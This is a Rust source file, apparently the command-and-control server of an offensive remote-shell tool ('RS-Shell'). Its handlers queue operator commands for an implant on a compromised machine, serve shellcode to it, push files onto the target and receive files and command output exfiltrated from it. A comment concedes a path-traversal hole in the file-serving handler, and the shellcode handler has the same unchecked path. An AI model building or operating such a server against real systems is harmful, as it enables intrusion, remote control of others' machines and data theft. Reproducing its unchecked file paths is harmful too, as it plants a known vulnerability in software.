use actix_files::NamedFile;
use actix_multipart::form::{MultipartForm, tempfile::TempFile};
use actix_web::web::Bytes;
use actix_web::{HttpRequest, HttpResponse, Responder, web};
use std::collections::VecDeque;
use std::fs::File;
use std::io::Write;
use std::path::PathBuf;
use std::sync::Arc;
use tokio::sync::{Mutex, Notify};

pub async fn index(_req: HttpRequest) -> impl Responder {
    r#"
    ____  _____      _____ __         ____
   / __ \/ ___/     / ___// /_  ___  / / /
  / /_/ /\__ \______\__ \/ __ \/ _ \/ / / 
 / _, _/___/ /_____/__/ / / / /  __/ / /  
/_/ |_|/____/     /____/_/ /_/\___/_/_/                                                  
    in Rust with love by BlackWasp
              @BlWasp_                          

   "#
    .to_string()
}

pub struct AppState {
    task_queue: Mutex<VecDeque<String>>,
    output: Mutex<Option<String>>,
    output_ready: Notify,
}

impl AppState {
    pub fn new() -> Self {
        Self {
            task_queue: Mutex::new(VecDeque::new()),
            output: Mutex::new(None),
            output_ready: Notify::new(),
        }
    }
}

pub async fn implant_os(bytes: Bytes) -> impl Responder {
    let os = String::from_utf8_lossy(bytes.to_vec().as_slice())
        .parse::<String>()
        .unwrap();
    log::debug!("OS: {}", os);
    let mut file = File::create("os.txt").expect("[-] Create os file failed");
    file.write_all(os.as_bytes())
        .expect("[-] Write os file failed");

    // When a new implant connects, all previous outputs are deleted
    match std::fs::remove_file("output.txt") {
        Ok(_) => (),
        Err(_) => (),
    }

    HttpResponse::Ok().body("OS written to file")
}

// Consumer : get a task from the queue
pub async fn next_task(state: web::Data<Arc<AppState>>) -> HttpResponse {
    let mut queue = state.task_queue.lock().await;
    match queue.pop_front() {
        Some(task) => HttpResponse::Ok().body(task),
        None => HttpResponse::Ok().body("No task"),
    }
}

// Similar to upload, this function only exists to make the code clearer
pub async fn shellcode(_req: HttpRequest) -> actix_web::Result<NamedFile> {
    let path: PathBuf = _req.match_info().query("shellcode").parse().unwrap();
    log::debug!("Path: {:?}", path);
    Ok(NamedFile::open(path)?)
}

/*
    'upload' is used to upload files on the target machine (not on the server), and 'download' is used to download files from the target machine
    Upload uses GET and download uses POST because in fact, during upload the implant writes the file on its machine, so it "GETS" the file from the server
    While during download, the implant reads the file from its machine and sends it to us, so it "POSTS" the file

    This code implies a potential security risk with path traversal, as the filename is not restricted
*/
pub async fn upload(_req: HttpRequest) -> actix_web::Result<NamedFile> {
    let path: PathBuf = _req.match_info().query("filename").parse().unwrap();
    log::debug!("Path: {:?}", path);
    Ok(NamedFile::open(path)?)
}

#[derive(Debug, MultipartForm)]
pub struct UploadForm {
    #[multipart(rename = "file")]
    files: Vec<TempFile>,
}

pub async fn download(MultipartForm(form): MultipartForm<UploadForm>) -> impl Responder {
    let mut filename = String::new();
    println!("Files: {:?}", form.files);
    for f in form.files {
        let path = format!("./downloads/{}", f.file_name.clone().unwrap());
        log::debug!("saving to {path}");
        f.file.persist(path).unwrap();
        filename = f.file_name.unwrap();
    }

    HttpResponse::Ok().body(format!("File {} downloaded", filename))
}

// Productor : add a task to the queue
pub async fn operator_cmd(state: web::Data<Arc<AppState>>, bytes: Bytes) -> HttpResponse {
    let body = String::from_utf8_lossy(&bytes)
        .trim_end_matches("\r\n\0")
        .to_string();
    let mut queue = state.task_queue.lock().await;
    queue.push_back(body);
    HttpResponse::Ok().body("Task queued")
}

// Consumer : wait for the output to be ready, then get it and delete it from the state
pub async fn wait_for_output(state: web::Data<Arc<AppState>>) -> HttpResponse {
    loop {
        // Check if the output is ready, if yes return it and delete it from the state
        {
            let mut output = state.output.lock().await;
            if let Some(data) = output.take() {
                log::debug!("Returning output: {}", data);
                return HttpResponse::Ok().body(data);
            }
        } // Release the lock before waiting for the notification

        // Wait for the implant to notify that the output is ready
        state.output_ready.notified().await;
    }
}

// Output received from the implant, save it in the state and notify the waiting consumer
pub async fn receive_output(state: web::Data<Arc<AppState>>, bytes: Bytes) -> HttpResponse {
    let body = String::from_utf8_lossy(&bytes).to_string();
    log::debug!("Output received: {}", body);
    let mut output = state.output.lock().await;
    *output = Some(body);
    state.output_ready.notify_one();
    HttpResponse::Ok().finish()
}
